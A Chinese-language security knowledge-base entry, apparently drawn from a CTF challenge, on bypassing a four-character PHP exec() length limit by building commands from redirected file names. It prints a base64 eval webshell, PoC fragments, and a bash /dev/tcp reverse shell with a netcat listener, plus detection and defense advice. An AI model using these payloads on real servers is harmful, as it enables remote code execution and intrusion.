---
id: web-php-rce-four-char-command-length-bypass
title: PHP exec 4 字符命令长度限制绕过：> 重定向拼文件 + sh 执行
type: scenario
domain: web
path: web/php/rce
technique: four-char-command-length-limit-redirection-bypass
aliases:
- 失语
- Mutsumi
- 4 字符命令
- 命令长度限制绕过
- '> 重定向拼接'
- base64 写马
- 短命令 getshell
tags:
- php
- rce
- command-execution
- length-limit
- shell-redirection
- bypass
- webshell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V125
  verified_at: '2026-11-06T04:20:16+08:00'
  notes: 已对照原文与截图核对：strlen<=4 限制、> 重定向分片、* 通配符/rev/sh 组装、base64 写 1.php、bash /dev/tcp 反弹与 sh 不支持 /dev/tcp 的坑均一致；原文为 CTF 环境无组件版本；未实际运行 PoC。
---

## 一句话结论

当 `exec()` 只允许执行长度不超过 4 的命令时，可以用 `>文件` 重定向逐个创建文件名为命令片段的小文件，再用 `*` 通配符、`rev` 反转、`sh` 执行等短命令把片段拼成 base64 字符串并写入 `1.php`，最终获得可交互的 Webshell 或反弹 Shell。

## 原理

- **长度限制只约束单条命令**：`strlen($_REQUEST['Mutsumi']) <= 4` 限制每次传入的命令长度，但不限制请求次数；攻击者可以发送任意多条 4 字符以内的命令，利用 shell 的文件系统状态跨请求累积。
- **`>` 重定向创建文件**：`>a` 创建空文件 `a`；`>ab` 创建文件 `ab`；文件名可以包含 `>`、`\`、空格等特殊字符（用 `\` 转义），因此可以把命令片段编码进文件名。每次请求只写一个文件名，长度容易控制在 4 以内。
- **通配符拼接**：`*` 会按字典序展开当前目录所有文件名；`*>v`、`*v>0` 等短命令可以把多个文件名作为参数传给某个命令/脚本。配合 `rev`（反转字符串）和 `sh`（执行脚本），可以把分散的文件名拼成完整命令。
- **base64 写马**：把 `<?php eval($_POST[1]);` 做 base64，得到 `PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==`。用 `>片段` 把 base64 字符逐段写进文件名，最后用 `sh` 执行一个由文件名拼出的脚本，执行 `echo${IFS}<base64>|base64 -d>1.php`，生成 Webshell；`${IFS}` 代替空格，避免一条命令出现两个空格。
- **反弹 Shell**：也可以把 `bash -c 'bash >& /dev/tcp/<ip>/<port> 0>&1'` 做 base64，按同样方式写入文件并执行；注意 `/dev/tcp` 是 bash 特性，`sh` 不支持，必须显式调用 `bash`。
- **为什么可行**：限制的是输入字符串长度，而不是系统调用次数或文件系统副作用；shell 的重定向、通配符和脚本执行提供了图灵完备的“分片组装”能力。

## 触发条件

- 存在 `exec`/`system`/`shell_exec` 等命令执行 sink，且对单次输入做严格长度限制（如 ≤4）。
- 命令在持久化的工作目录中执行（如 session 沙箱），多次请求之间文件系统状态保留。
- Web 进程对当前目录可写，且可执行 `sh`/`bash`、`base64`、`rev` 等基础命令。
- 攻击者能保持同一会话（同一沙箱目录），或能预测/枚举沙箱路径。

## 利用步骤

1. 确认长度限制与沙箱：访问页面得到 `Sandbox: /var/www/html/<random>`；后续请求必须带同一 `PHPSESSID`，否则会创建新沙箱。
2. 用 `>文件名` 逐个创建文件，把目标命令（base64 字符串、`echo`、管道、重定向等）拆成 ≤4 字符的片段写进文件名。
3. 用 `*`、`rev` 等短命令把文件名拼成完整命令/脚本；用 `sh <文件>` 执行脚本。
4. 生成 `1.php`（内容为 `<?php eval($_POST[1]);`），访问沙箱下的 `1.php`，POST `1=system('id');` 验证 RCE。
5. 若要反弹 Shell，把 `bash -c 'bash >& /dev/tcp/<ip>/<port> 0>&1'` 做 base64 后按同样方式写入并执行；在 VPS 上 `nc -lvnp <port>` 监听。

## PoC

```text
# 每次请求执行一条 ≤4 字符命令（示例为片段，实际需按目录/文件名调整）
>dir
>f\>
>ht-
>sl
*>v
>rev
*v>0
>hp
>p\
>1.\
>\>\
>-d\
>\ \
>64\
>se\
>ba\
...
sh 0
sh f
```

```text
# 最终效果（等价于）
echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64 -d>1.php
# 然后访问 http://target/<sandbox>/1.php，POST 1=system('id');
```

```text
# 反弹 Shell 的等价命令
bash -c 'bash >& /dev/tcp/<ip>/<port> 0>&1'
```

## 变体与关联

- 片段组织变体：可用 `rev` 反转字符串、`*` 通配符排序、`>>` 追加（超过 4 字符时用文件名/通配符间接实现）、`sh`/`bash` 执行脚本。
- 写马变体：base64 编码可换成 hex/octal、`printf`、`echo -e`；也可直接写反向 shell 脚本而不生成 PHP 马。
- 长度限制变体：3 字符、5 字符等限制下调整片段划分；若禁用 `>`/`*`/`sh`，需要寻找其它原语（如 `wget` 短参数、`curl` 配置文件）。
- 关联：[[web-php-rce-command-injection-blacklist-base64-tee-webshell]]（base64+tee 写马）、[[web-php-rce-command-space-blacklist-tab-passthru]]（空格过滤绕过）。

## 检测与防御

- 检测：同一会话短时间内大量极短（≤4 字符）命令请求；目录中出现大量名称异常的小文件（文件名含 `>`、`\`、base64 片段）；随后出现 `sh`/`bash` 执行、`base64 -d`、`1.php` 等 Webshell 文件。
- 防御：不要只限制输入长度；对命令执行接口做参数白名单/固定命令映射，禁止用户控制完整命令行；禁用 `exec`/`system` 等危险函数，或使用 `disable_functions` + 沙箱。
- 加固：沙箱目录不可执行、不可写 Web 可访问路径；限制 `sh`/`bash`/`base64`/`rev` 等工具；监控异常文件名与短命令风暴。
